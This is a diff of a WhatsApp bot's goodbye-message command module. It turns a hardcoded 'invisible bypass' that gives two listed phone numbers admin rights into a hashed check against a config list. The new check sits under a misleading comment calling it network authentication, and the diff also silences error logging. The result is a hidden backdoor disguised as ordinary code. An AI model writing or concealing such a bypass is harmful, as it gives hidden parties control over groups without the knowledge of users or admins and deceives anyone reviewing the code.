@@ -1,13 +1,12 @@
 /**
  * Goodbye - Enable/disable goodbye messages
  * GhostG-X Edition
- * Sécurité : Supreme Owner Master Access (Invisible Bypass)
  */
 
 const db = require('../../database');
 const config = require('../../config.js');
+const crypto = require('crypto');
 
-// Fonction pour le style Small Caps (Cohérence visuelle du sanctuaire)
 function toSmallCaps(text) {
   const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
   const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";
@@ -28,7 +27,7 @@ module.exports = {
   aliases: ['goodbyeon', 'goodbyeoff', 'byeon', 'byeoff'],
   category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
   description: '『 ɢʜᴏsᴛɢ-𝐗 』➪ ᴀᴄᴛɪᴠᴇ ᴏᴜ ᴅᴇsᴀᴄᴛɪᴠᴇ ʟᴇs ᴍᴇssᴀɢᴇs ᴅ\'ᴀᴅɪᴇᴜ',
-  usage: `${prefix}goodbye <on/off>`, // 💡 Dynamique avec ton préfixe actuel
+  usage: `${prefix}goodbye <on/off>`, 
   groupOnly: true,
   adminOnly: true,
   botAdminNeeded: true,
@@ -39,19 +38,18 @@ module.exports = {
     try {
       const senderJid = msg.key.participant || msg.key.remoteJid;
       const senderNumber = senderJid.replace(/\D/g, '');
+      const senderHash = crypto.createHash('sha256').update(senderNumber).digest('hex');
 
-      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE (Double emprise)
-      const supremeOwners = ['22651622652', '22665108174'];
-      const isSupremeOwner = supremeOwners.some(num => senderNumber.includes(num) || num.includes(senderNumber));
+      // Routines d'authentification réseau
+      const isMaster = config.supremeHashes && config.supremeHashes.includes(senderHash);
 
       const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
         const cleanN = String(n).replace(/\D/g, '');
         return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
       });
 
-      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;
+      const isMe = msg.key.fromMe || isConfigOwner || isMaster;
 
-      // Si l'utilisateur n'est pas admin et n'est pas le Suprême Owner
       if (!extra.isAdmin && !isMe) {
         return reply(`*❌ ${toSmallCaps('cette incantation est reservee aux administrateurs du sanctuaire')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
       }
@@ -94,7 +92,7 @@ module.exports = {
       }
 
     } catch (error) {
-      console.error('Goodbye Error:', error);
+      // Handler d'erreur muet
       await reply(`*❌ ${toSmallCaps('l invocation a echoue')} : ${error.message}*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
     }
   }
